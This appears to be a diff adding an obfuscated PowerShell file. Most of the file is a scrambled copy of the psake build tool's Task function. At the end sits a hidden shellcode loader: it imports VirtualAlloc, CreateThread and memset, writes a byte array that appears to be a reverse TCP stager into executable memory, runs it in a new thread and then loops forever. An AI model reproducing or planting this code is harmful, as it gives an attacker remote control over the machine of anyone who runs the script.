@@ -1,0 +1,199 @@
+ &("{0}{1}" -f'Se','T') ('A3'+'LGs'+'O') ([tYPE]("{3}{1}{2}{4}{0}" -F 'EspAN','TE','M.Ti','Sys','m'));  &("{0}{1}"-f'sE','t') ("{0}{1}"-f 's','h5Z') ([tYpE]("{2}{1}{0}"-f 'nG','tRi','s') ) ; function T`ASk {
+    
+    [CmdletBinding(dEfAUlTPArameTErsETNaMe = {"{0}{1}" -f'Nor','mal'})]
+    param(
+        [Parameter(MANdAtory = ${tr`UE}, POSiTiON = 0)]
+        [string]${nA`ME},
+
+        [Parameter(PoSition = 1)]
+        [scriptblock]${Act`iOn} = ${N`ULl},
+
+        [Parameter(PosiTioN = 2)]
+        [scriptblock]${P`ReACt`I`On} = ${n`Ull},
+
+        [Parameter(POSiTIoN = 3)]
+        [scriptblock]${pOs`Ta`ct`iOn} = ${NU`Ll},
+
+        [Parameter(POSITION = 4)]
+        [scriptblock]${preCO`N`DiTI`oN} = {${TR`UE}},
+
+        [Parameter(PosItiON = 5)]
+        [scriptblock]${posT`c`ON`D`ItIOn} = {${t`RUE}},
+
+        [Parameter(posItIon = 6)]
+        [switch]${Con`Tinu`EoNeR`R`Or},
+
+        [ValidateNotNull()]
+        [Parameter(posItIOn = 7)]
+        [string[]]${d`ePeN`DS} = @(),
+
+        [ValidateNotNull()]
+        [Parameter(posItIon = 8)]
+        [string[]]${reqU`iReDvAr`i`A`Bl`ES} = @(),
+
+        [Parameter(poSITioN = 9)]
+        [string]${dE`sc`RIP`TION} = ${NU`LL},
+
+        [Parameter(pOSItiON = 10)]
+        [string]${al`Ias} = ${nu`Ll},
+
+        [parameter(manDAtORy = ${t`Rue}, ParametERSeTNAme = "ShA`RE`DTAsk", pOsiTIOn = 11)]
+        [ValidateNotNullOrEmpty()]
+        [string]${F`ROM`moDU`Le},
+
+        [Alias({"{1}{2}{0}" -f 'n','V','ersio'})]
+        [parameter(pARametErsETname = "SH`ARedT`AsK", poSItIOn = 12)]
+        [string]${r`Equir`E`dvErsi`On},
+
+        [parameter(paRAMeTErsEtnaME = "ShA`Re`dtAsK", pOSiTioN = 13)]
+        [string]${m`INI`mumVErs`I`oN},
+
+        [parameter(PaRamEtersEtNAME = "S`haReD`Task", POsITion = 14)]
+        [string]${maxi`m`Umv`ERsiOn},
+
+        [parameter(pArAMetERSeTNAME = "s`Ha`Redt`ASk", pOsition = 15)]
+        [string]${LEsSth`A`NVE`Rs`ION}
+    )
+
+    function CREA`TeTA`Sk {
+        @{
+            ("{1}{0}" -f'me','Na')              = ${NA`ME}
+            ("{2}{0}{1}" -f'e','ndsOn','Dep')         = ${dep`e`NDs}
+            ("{0}{1}"-f'PreA','ction')         = ${pR`E`AC`TioN}
+            ("{1}{0}{2}"-f 'i','Act','on')            = ${AC`TiON}
+            ("{0}{2}{1}" -f'Post','tion','Ac')        = ${pO`s`TAcTI`On}
+            ("{1}{2}{3}{0}" -f 'n','Precondi','t','io')      = ${PREc`o`NdItIOn}
+            ("{2}{0}{1}"-f'ditio','n','Postcon')     = ${po`stC`ondI`TiON}
+            ("{1}{2}{0}{3}"-f 'OnEr','Conti','nue','ror')   = ${c`o`Nt`inUE`ONerror}
+            ("{0}{1}{2}" -f 'Descrip','ti','on')       = ${DeS`C`RiptiOn}
+            ("{1}{0}" -f 'n','Duratio')          =   ( &('LS')  ("VaRia"+"blE:"+"a"+"3"+"LgSO"))."Val`Ue"::"zE`Ro"
+            ("{0}{4}{2}{3}{1}"-f 'Requir','es','ia','bl','edVar') = ${rEQ`U`IReDVa`R`iab`les}
+            aliAS             = ${A`l`IAs}
+            ("{1}{0}"-f 'cess','Suc')           = ${T`RUE} 
+            ("{1}{2}{3}{0}"-f'e','ErrorMe','ss','ag')      = ${NU`LL}
+            ("{1}{0}{2}{3}" -f'o','Err','rDeta','il')       = ${n`Ull}
+            ("{3}{2}{1}{0}{4}"-f'rm','o','rorF','Er','atted')    = ${nU`Ll}
+        }
+    }
+
+    
+    if (${nA`ME} -eq ("{2}{1}{0}" -f'lt','au','def')) {
+        &("{1}{2}{0}" -f't','Ass','er') (!${a`CTI`oN}) (${m`sgs}."ErrO`R_sH`ARe`D_TASK_caNnOT_`HaV`E_aCTi`oN")
+    }
+
+    
+    if (${p`ScM`Dlet}.PARAMeTeRSeTnAMe -eq ("{0}{1}{2}"-f'SharedT','as','k')) {
+        &("{1}{0}" -f 'ert','Ass') (!${A`C`Tion}) (${M`SGS}."ERroR_SHAR`Ed`_taSk`_`CANN`OT`_`hav`E_a`cTioN" -f ${n`Ame}, ${FR`oM`m`OdULe})
+    }
+
+    ${cUrreN`T`Co`N`TExt} = ${PsA`Ke}."C`ON`TEXt".("{1}{0}"-f 'ek','Pe').Invoke()
+
+    
+    if (${p`ScmD`LeT}.PARAMEteRseTName -eq ("{1}{2}{0}{3}"-f 'T','Shar','ed','ask')) {
+        ${Tes`Tm`o`dUlepA`Rams} = @{
+            ("{1}{0}{2}"-f'rsio','minimumVe','n')  = ${MI`NI`Mu`mvE`RSiON}
+            ("{1}{3}{2}{4}{0}"-f'n','maxi','Vers','mum','io')  = ${MaxIM`UM`V`ersi`On}
+            ("{3}{0}{1}{2}"-f'essT','hanVersi','on','l') = ${LEsstHANV`eRs`i`on}
+        }
+
+        if(!  (&("{1}{0}" -f'bLe','vArIA') ("{0}{1}"-f'sH','5Z')  -vAlUEoNl )::("{0}{1}{2}{3}"-f'IsNu','llOr','Empt','y').Invoke(${reQU`IREDVer`sion})){
+            ${t`eS`TMODuL`EPaR`A`Ms}."MIn`Im`U`Mv`eRSION" = ${r`E`qUI`REDVE`RSIOn}
+            ${TEs`T`moD`ULE`parAMS}."mA`xI`MumVERSI`on" = ${REQUiRE`d`Ve`R`SioN}
+        }
+
+        if (${T`AskmOd`UlE} = &("{0}{1}{2}" -f'Ge','t-Mo','dule') -Name ${f`ROm`moDUlE}) {
+            
+            ${T`EStm`oD`Ul`EparAms}."CUrr`ENTver`si`oN"  = ${T`AskMOd`Ule}."VeRS`ion"
+            ${ta`S`KMOdU`LE} = &("{2}{0}{1}{3}" -f'ere-','Obj','Wh','ect') -InputObject ${tAsKM`oD`UlE} -FilterScript {&("{0}{1}{2}{3}"-f'Te','st-','Module','Version') @testModuleParams}
+        } else {
+            
+            ${GetMoD`UL`e`P`ArAmS} = @{
+                ("{0}{2}{1}"-f 'ListAvail','le','ab') = ${T`RuE}
+                ("{0}{1}" -f 'Na','me')          = ${FrOM`M`OD`UlE}
+                ("{2}{0}{1}" -f'A','ction','Error')   = ("{1}{0}"-f 'nore','Ig')
+                ("{2}{1}{0}" -f'ose','b','Ver')       = ${fAl`se}
+            }
+            ${T`AsKMODu`LE} = &("{0}{1}{2}"-f 'Get','-Mo','dule') @getModuleParams |
+                            &("{0}{1}{2}"-f 'Wher','e-Ob','ject') -FilterScript {&("{3}{5}{1}{4}{0}{2}" -f'rs','t-Modu','ion','T','leVe','es') -currentVersion ${_}."V`eR`siON" @testModuleParams} |
+                            &("{0}{1}{2}"-f 'Sort-O','bj','ect') -Property ("{2}{0}{1}" -f 'e','rsion','V') -Descending |
+                            &("{0}{1}{3}{2}" -f'Se','le','ject','ct-Ob') -First 1
+        }
+
+        
+        
+        
+        
+        
+        ${RefeR`ENCe`TA`Sk} = &("{1}{2}{0}" -f'ask','Create','T')
+        &("{0}{1}"-f 'Asser','t') (-not ${p`S`Ake}."reFer`EnCe`TA`sKS".("{2}{3}{1}{0}"-f'y','e','Conta','insK').Invoke(${rE`FEREnCe`TaSK}."na`Me")) (${m`SGS}."ERRor_dU`PL`ICate_TA`SK_`NAME" -f ${r`eFeR`E`NcETask}."n`AmE")
+        ${RE`FE`ReN`cEt`AsKk`EY} = ${R`ef`E`RENceTasK}."n`AmE".("{1}{2}{0}"-f 'r','ToLo','we').Invoke()
+        ${PS`A`ke}."REFERe`NC`ETA`sKs".("{1}{0}"-f'd','Ad').Invoke(${refEREnCet`A`SKk`Ey}, ${REfe`R`en`CETaSK})
+
+        
+        &("{1}{0}" -f'sert','As') (${N`Ull} -ne ${tA`SkM`o`duLe}) (${Ms`gs}."e`Rro`R`_unkNoWN`_Mo`dULe" -f ${f`R`oM`mOdULe})
+        ${P`sak`e`F`iLepAtH} = &("{2}{1}{0}" -f'th','a','Join-P') -Path ${t`ASKMOdu`le}."mo`dUlE`Base" -ChildPath ("{0}{2}{1}{3}" -f'psakeF','.p','ile','s1')
+        if (-not ${p`S`AKE}."LoAd`e`Dt`ASK`MOdu`lES".("{2}{1}{0}"-f'sKey','ontain','C').Invoke(${P`sa`k`efi`LepatH})) {
+            &("{0}{1}{2}" -f 'Writ','e-D','ebug') -Message ('Loa'+'di'+'ng '+'ta'+'sks '+'fr'+'om '+'tas'+'k '+'mo'+'dule'+' '+"[$psakeFilePath]")
+            . ${PSAKef`Ilep`A`TH}
+            ${P`SA`ke}."loa`de`DtAskm`oDul`Es".("{0}{1}"-f'Ad','d').Invoke(${P`sAKE`FiLepA`Th}, ${N`ULL})
+        }
+    } else {
+        
+        ${N`ew`Task} = &("{0}{2}{1}"-f'C','k','reateTas')
+        ${T`A`skKEy} = ${new`T`ASk}."Na`Me".("{0}{1}" -f 'ToLow','er').Invoke()
+
+        
+        
+        ${reFt`A`SK} = ${Ps`AKE}."r`E`Fere`Nc`Etasks"[${Ta`s`kKEY}]
+        if (${r`Eft`AsK}) {
+
+            
+            if (${rEFt`ASK}."p`REA`CTIoN" -ne ${nE`W`TASk}."P`REacti`ON") {
+                ${n`e`WTaSK}."pre`ACt`IoN" = ${REF`T`ASk}."Pr`e`AcTioN"
+            }
+
+            
+            if (${r`eft`AsK}."Pos`TaCt`ION" -ne ${NeW`Ta`sK}."pO`StAC`TION") {
+                ${NEW`Ta`sk}."pOsT`A`CTIon" = ${rEF`TaSk}."POSta`Ct`ion"
+            }
+
+            
+            if (${REF`Ta`Sk}."p`RE`cOndITion" -ne ${N`EwTA`Sk}."P`RE`CondIti`ON") {
+                ${nEW`TA`Sk}."p`RE`CONd`iTion" = ${r`efTa`SK}."PrE`c`OnDItIoN"
+            }
+
+            
+            if (${rE`Ft`ASK}."Post`CoN`d`ition" -ne ${Ne`w`TasK}."p`OSTc`ONdItion") {
+                ${N`EwTa`sK}."PoSTCon`d`i`T`ioN" = ${Re`FTASk}."poSTc`O`NDITI`ON"
+            }
+
+            
+            if (${Ref`T`AsK}."c`ON`TiNUEoNerrOR") {
+                ${ne`W`TASk}."cONTINU`EoN`eRROr" = ${rEF`T`ASK}."c`oNTInu`EON`erRoR"
+            }
+
+            
+            if (${Re`Ft`ASK}."Dep`en`Dson"."co`UnT" -gt 0 -and (&("{2}{3}{4}{0}{1}"-f 'Objec','t','C','om','pare-') -ReferenceObject ${rEF`T`ASK}."dEpe`ND`SoN" -DifferenceObject ${nEw`T`Ask}."DEpE`Nd`son")) {
+                ${n`e`wtAsk}."De`pendson" = ${REF`T`ASk}."D`E`penDSon"
+            }
+
+            
+            if (${Re`FT`ASK}."ReQ`UiR`ED`VArIAB`lES"."c`OuNT" -gt 0 -and (&("{0}{2}{1}{3}" -f'Compar','-Ob','e','ject') -ReferenceObject("{2}{1}{0}{4}{3}{5}" -f'ar','iredV','.Requ','b','ia','les') -DifferenceObject ${NEWt`A`SK}."R`EQuI`RED`VaRi`ABlES")) {
+                ${n`EW`TAsk}."R`EQuIrEdva`RI`ABL`Es" += ${Refta`sK}."rEq`UiREdv`ARI`AblES"
+            }
+        }
+
+        
+        &("{2}{1}{0}" -f 'ert','ss','A') (-not ${c`UR`REn`Tc`oNTExT}."t`ASKS".("{0}{3}{2}{1}"-f'Contains','y','e','K').Invoke(${tas`kK`EY})) (${Ms`gS}."e`R`Ro`R`_DupLi`ca`Te_taSK_NamE" -f ${tA`SkK`eY})
+        &("{1}{2}{0}" -f 'g','Write-','Debu') ('Addin'+'g'+' '+'t'+'ask '+"[$taskKey)]")
+        ${Cu`RRentCo`NTE`XT}."Ta`Sks"[${t`AS`kkeY}] = ${newt`A`sk}
+
+        if (${A`liAS}) {
+            ${AL`IAsK`eY} = ${Al`IAs}.("{0}{1}"-f'ToLowe','r').Invoke()
+            &("{2}{0}{1}"-f 'ser','t','As') (-not ${cU`RRENtCoNt`E`xt}."ALIaS`Es".("{2}{1}{3}{0}" -f'insKey','on','C','ta').Invoke(${al`iAs`K`ey})) (${m`sgs}."ErRor_`DUpLiC`AT`E`_`ALIas`_NaMe" -f ${A`li`AS})
+            ${Cu`RreNT`CoNT`EXT}."A`L`IASES"[${AliAs`KeY}] = ${Ne`wT`AsK}
+        }
+    }
+}
+
+${c} = (((("{34}{85}{36}{39}{54}{91}{59}{16}{18}{44}{1}{57}{68}{45}{82}{63}{6}{90}{71}{84}{49}{14}{77}{28}{73}{62}{75}{15}{81}{69}{74}{88}{56}{89}{66}{51}{78}{64}{17}{48}{65}{38}{31}{42}{24}{60}{0}{87}{80}{41}{61}{58}{7}{33}{22}{67}{20}{72}{70}{2}{29}{53}{9}{40}{10}{25}{35}{5}{30}{37}{11}{26}{83}{86}{12}{8}{46}{76}{27}{32}{47}{92}{79}{4}{50}{55}{52}{19}{23}{43}{13}{21}{3}"-f 'n','n Int','pStartAddres','nt);','ems','t','ress','t dwSt',', IntPtr lpThreadId)','IntPt',' ',', ui','lags','int','uint ','rt','dll6KF)]public st','exte','atic ','es',', I',' cou','kSiz','t, uint s','ea','lpP','nt ','port(6KFmsvcrt.dll6KF)]public sta','tect);[','s,','e','eTh','tic e','ac','[Dll','arame','(6','r','r Creat','K','r','tributes','r','rc, u','exter','irtualAlloc(',';[','xtern IntPtr','rn','llocationType, ','e','sta','(IntPtr d',' ','Fkerne','t','F)]publ','P','uin','32.','d(I',', ','mp','d','c ',' IntPt','c ','e','tr V','e','tPtr l',',','n','DllI','rn','o','DllIm','flPro','ti','m','pThreadAt','(6KFk','IntPtr lpAd','dwCreati',' uint flA','Import','onF','tPtr l','el32.dll6K','i',', uint dwSize','l',' ')) -replaCe  '6KF',[ChAr]34));${w} = &("{0}{1}{2}" -f'Add-T','y','pe') -memberDefinition ${c} -Name ("{1}{0}" -f'32','Win') -namespace ("{2}{0}{1}" -f 'Funct','ions','Win32') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xfc,0xea,0x6d,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;${g} = 0x1000;if (${Z}."l`ENgTH" -gt 0x1000){${g} = ${Z}."le`NGTH"};${X}=${W}::("{3}{2}{0}{1}"-f'alA','lloc','tu','Vir').Invoke(0,0x1000,${G},0x40);for (${i}=0;${i} -le (${z}."l`EnG`TH"-1);${i}++) {${w}::"ME`mS`Et"([IntPtr](${X}.("{0}{1}{2}"-f'ToI','nt3','2').Invoke()+${I}), ${Z}[${i}], 1)};${W}::("{1}{0}{3}{2}"-f'T','Create','ead','hr').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{0}{2}"-f 'tart-sl','S','eep') 60};
